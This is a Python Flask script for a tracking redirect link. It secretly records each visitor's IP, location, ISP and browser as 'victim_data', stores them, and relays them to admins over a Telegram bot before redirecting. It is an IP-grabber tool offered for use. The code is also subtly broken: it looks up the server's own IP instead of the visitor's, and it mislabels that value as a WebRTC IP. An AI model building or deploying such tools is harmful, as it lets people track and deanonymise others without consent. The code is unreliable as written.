from flask import Flask, request, redirect
from database import *
import datetime
from config import *
from telebot import TeleBot, apihelper
import requests

bot = TeleBot(API_token)

app = Flask(__name__)

def notify_admins(original_url, client_ip, victim_data, user_agent):
    admins = get_admins()
    if admins:
        for admin in admins:
            admin_id = admin[2]
            if not admin_id:
                print(f"Invalid admin ID: {admin_id}")
                continue
            
            message = (
                f"Коментарій - {admin[1]}\n"
                f"| IP {client_ip}\n"
                f"| Місто - {victim_data.get('city', 'N/A')}\n"
                f"| Країна - {victim_data.get('country', 'N/A')}\n"
                f"| Хостер - {victim_data.get('org', 'N/A')}\n"
                f"| Організація - {victim_data.get('asn', 'N/A')}\n"
                f"| Сайт - {original_url}\n"
                f"| Дата - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"| Браузер - {user_agent}\n"
                f"| WebRTC IP (public): {client_ip}\n"
            )

            try:
                bot.send_message(admin_id, message)
            except apihelper.ApiTelegramException as e:
                print(f"Failed to send message to {admin_id}: {e}")

@app.route("/redirecting", methods=['GET'])
def redirect_url():
    original_url = request.args.get('url')
    if not original_url:
        return "No URL provided", 400

    user_agent = request.user_agent.string

    response = requests.get(f'https://api.ipquery.io/?format=json')
    ip_data = response.json()
    client_ip = ip_data.get('ip', {})
    victim_data = {
        'asn': ip_data.get('isp', {}).get('asn', 'N/A'),
        'org': ip_data.get('isp', {}).get('org', 'N/A'),
        'country': ip_data.get('location', {}).get('country', 'N/A'),
        'city': ip_data.get('location', {}).get('city', 'N/A'),
        'local_ip': request.environ.get('HTTP_X_FORWARDED_FOR', 'N/A'),
        'user_agent': user_agent
    }

    insert_data(original_url, victim_data)
    notify_admins(original_url, client_ip, victim_data, user_agent)

    return redirect(original_url)

def run_flask():
    app.run(host=db_host, port=flask_port)

if __name__ == '__main__':
    run_flask()
